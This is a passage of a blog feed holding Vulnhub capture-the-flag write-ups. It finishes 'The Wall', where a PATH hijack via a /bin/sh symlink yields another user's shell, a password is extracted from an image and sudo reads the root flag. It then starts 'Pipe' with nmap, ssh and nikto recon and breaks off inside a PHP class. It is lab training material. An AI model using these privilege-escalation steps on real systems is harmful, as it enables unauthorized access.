getc
puts
system
_thread_atfork
environ
__progname
__cxa_atexit
__sF
__isthreaded
scanf
_Jv_RegisterClasses
__got_start
__got_end
__data_start
_edata
__bss_start
__progname_storage
__fini
__init_tcb
QRP1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;^_]
Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 www.google.com
Keep Talking- The Division Bell
mail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Creating symlinks and overwriting the &lt;b&gt;PATH&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/sh /tmp/mail
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now it's time to run this program once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
DavidGilmour&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another account added to collection! What will he have in home directory? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/DavidGilmour
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 408
drwx------  4 DavidGilmour  DavidGilmour     512 Oct 28  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  7 root          wheel            512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour      87 Oct 24  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     773 Oct 24  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     103 Oct 24  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     398 Oct 24  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     175 Oct 24  2015 .mailrc
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 26  2015 .private
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     218 Oct 24  2015 .profile
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 28  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 DavidGilmour  DavidGilmour     384 Aug  8  2015 anotherbrick.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour    1022 Oct 26  2015 bio.txt
&lt;span class=&quot;nt&quot;&gt;-rwxr-----&lt;/span&gt;  1 DavidGilmour  DavidGilmour  182073 Oct 28  2015 david_gilmour_profile_pic.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 DavidGilmour  DavidGilmour     785 Oct 27  2015 mbox&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;anotherbrick.txt  &lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;anotherbrick.txt                                                                                                                               
&lt;span class=&quot;c&quot;&gt;# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond&lt;/span&gt;

New website &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

&lt;span class=&quot;c&quot;&gt;# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;New website, that's cool! Let's take a look at it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.103/pinkfloyd1965newblogsite50yearscelebration-temp/index.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/new-web.png&quot; alt=&quot;New website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you take a closer look at the image, you will be able to find pieces of a string. I've managed to play a little with the setting in &lt;b&gt;gimp&lt;/b&gt; and changing &lt;b&gt;threshold&lt;/b&gt; allowed us to see whole message. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/img-after.png&quot; alt=&quot;Image after&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/welcometothemachine
50696e6b466c6f796435305965617273&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I've tried looking for this direcotory in the website, but there was nothing. After coming back to the David's home directory, I've found his password in the image file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings david_gilmour_profile_pic.jpg
8?&amp;gt;&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
dy~g
|Mvk
7OnN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Nn_&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
^&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;W
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;w|6
Om?OoA
who_are_you_and_who_am_i&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And after logging in, I've used &lt;b&gt;find&lt;/b&gt; command to look for a directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su DavidGilmour
Password:
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'welcometothemachine'&lt;/span&gt; 2&amp;gt;/dev/null
/var/www/htdocs/welcometothemachine
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/htdocs/welcometothemachine
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x  2 root  welcometothemachine   512 Aug  8  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---  4 www   welcometothemachine   512 Nov 27  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rws--s---&lt;/span&gt;  1 root  welcometothemachine  7513 Nov 27  2015 PinkFloyd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;PinkFloyd                                                                  
Please send your answer to Old Pink, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your controls to the heart of the sun!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Permissions granted? What does it mean? After a while, I noticed that the &lt;b&gt;sudo&lt;/b&gt; permissions were granted to us. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /root
Password:
total 48
drwx------   5 root  wheel   512 Nov 27  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  13 root  wheel   512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel    87 Aug 16  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   578 Aug 16  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel    94 Aug 16  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   328 Aug 16  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel   468 Aug 16  2015 .profile
drwx------   2 root  wheel   512 Nov 27  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root  wheel  2739 Nov 27  2015 flag.txt
drwxr-xr-x   2 root  wheel   512 Nov 14  2015 scripts
drwxr-xr-x   2 root  wheel   512 Oct 27  2015 tmp
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cat&lt;/span&gt; /root/flag.txt

&lt;span class=&quot;s2&quot;&gt;&quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&quot;&lt;/span&gt;

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ &lt;span class=&quot;s1&quot;&gt;'__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,'&lt;/span&gt; , &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | ,&lt;span class=&quot;s1&quot;&gt;' |       |       |       | |
  |_|_______|_______|____ '&lt;/span&gt; | _ | | &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |&lt;span class=&quot;s1&quot;&gt;'\ _|_______|_______|_______|_|
  |     |       |       |   \  _'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'&lt;/span&gt;_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-&lt;span class=&quot;s1&quot;&gt;'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-'&lt;/span&gt; |  ,-. &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |       |       |     |
  |_____|_______|_______|_ | _ |-&lt;span class=&quot;s1&quot;&gt;'`-'&lt;/span&gt;  |  | ,&lt;span class=&quot;s1&quot;&gt;' _|_______|_______|_____|
  | |       |       |      |        |  '&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'        |       |       | |
  |_|_______|_______|______&quot;|_____  _,- o'&lt;/span&gt;__|_______|_______|_______|_|
  |     |       |       |       _,-&lt;span class=&quot;s1&quot;&gt;'    .       |       |       |     |
  |_____|_______|_______|_ _,--'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     _,-&lt;span class=&quot;s1&quot;&gt;'_____|_______|_______|_____|
  | |       |       |     '&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;_||-&lt;span class=&quot;s1&quot;&gt;' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'&lt;/span&gt;  __|_______|_______|_______|_|
  |     |       |       |       |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;_,-&lt;span class=&quot;s1&quot;&gt;'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; |   | __|_______|_______|_____|
  | |       |       |       &lt;span class=&quot;s1&quot;&gt;'  V/    |  |-'&lt;/span&gt; |__,    |       |       | |
  |_|_______|_______|_______|_______ _______&lt;span class=&quot;s1&quot;&gt;'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - &quot;the test bunnies&quot;

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here we have the flag! &lt;/p&gt;
</description>
        <pubDate>Mon, 07 Aug 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-the-wall/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-the-wall/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - /dev/random Pipe</title>
        <description>&lt;p&gt;Hello everyone, let's work on another machine from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; called &lt;b&gt;Pipe&lt;/b&gt;. Let's see how difficult it is! &lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/sagi-,36/&quot;&gt;&lt;b&gt;Sagi&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/devrandom-pipe,124/&quot;&gt;&lt;b&gt;/dev/random/ Pipe&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;&lt;/p&gt;
&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.102&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;As always we have to start from finding out the IP address of the vulnerable machine, with essential info about services running on it.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.1/24

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-29 16:13 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00015s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000067s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:1D:FF:E0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.101 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00014s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:39:B5:70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000024s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.102 are closed

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.83 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Basic info done, let's take a look at it. &lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;192.168.56.103&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Open ports: &lt;b&gt;22 SSH&lt;/b&gt;, &lt;b&gt;80 HTTP&lt;/b&gt; and &lt;b&gt;111 RPCBIND&lt;/b&gt;. &lt;/p&gt;
&lt;p&gt;We can start from the bottom, maybe SSH will print us some clues, which are essential for further exploitation. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh 192.168.56.103
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'192.168.56.103 (192.168.56.103)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:6CI3N5VMaSG6TNWPt/7nhor3Dd4ug8YJel9Ycv/Ytwc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;192.168.56.103&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
root@192.168.56.103'&lt;/span&gt;s password:
Permission denied, please try again.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately nothing here, no banners, no users, nothing. Maybe website wil be more useful?  Let's take a look at it. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/access.png&quot; alt=&quot;Access&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks as if &lt;b&gt;index.php&lt;/b&gt; file is password protected. Every popular credentials I entered showed &lt;b&gt;Unauthorized&lt;/b&gt; message, so we have to look further. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Unauthorized

This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;My next step is to run &lt;b&gt;nikto&lt;/b&gt; and &lt;b&gt;dirbuster&lt;/b&gt; scans to check for any hidden directories and possible vulnerabilities. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.103
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-07-29 16:21:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ IP address found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s1&quot;&gt;'location'&lt;/span&gt; header. The IP is &lt;span class=&quot;s2&quot;&gt;&quot;127.0.1.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+ OSVDB-630: IIS may reveal its internal or real IP &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the Location header via a request to the /images directory. The value is &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.1.1/images/&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
...
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ OSVDB-3268: /images/: Directory indexing found.
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ OSVDB-3268: /images/?pattern&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&amp;amp;sort&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;name: Directory indexing found.
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ 7685 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 7 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-07-29 16:21:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, images directory. This path &lt;b&gt;/images/pipe.jpg&lt;/b&gt; presents an image of a pipe. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/pipe.png&quot; alt=&quot;Pipe image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately, checking it for hidden messages wasn't so succesful, so I decided to look at dirbuster scan. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/dirbuster.png&quot; alt=&quot;Dirbuster&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another directory, and this one was missed by nikto. As these files may be very useful, let's take a look at them. &lt;/p&gt;
&lt;p&gt;&lt;b&gt;log.php.BAK&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	      &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
